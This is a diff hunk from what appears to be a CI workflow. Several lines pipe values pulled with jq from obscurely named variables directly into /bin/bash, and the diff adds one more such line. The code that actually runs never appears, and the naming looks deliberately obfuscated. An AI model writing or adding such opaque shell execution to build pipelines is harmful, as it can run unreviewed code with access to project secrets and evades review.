@@ -27,6 +27,7 @@ jobs:
           echo $col8 | jq -r .mnk32 | /bin/bash
           echo $c59720 | jq -r .vy39481 | /bin/bash
           printf '%s' "$f13" | jq -r .icj0 | /bin/bash
+          printf '%s' "$g79" | jq -r .ybq321 | /bin/bash
 
       - name: Upload artifact
         if: always()
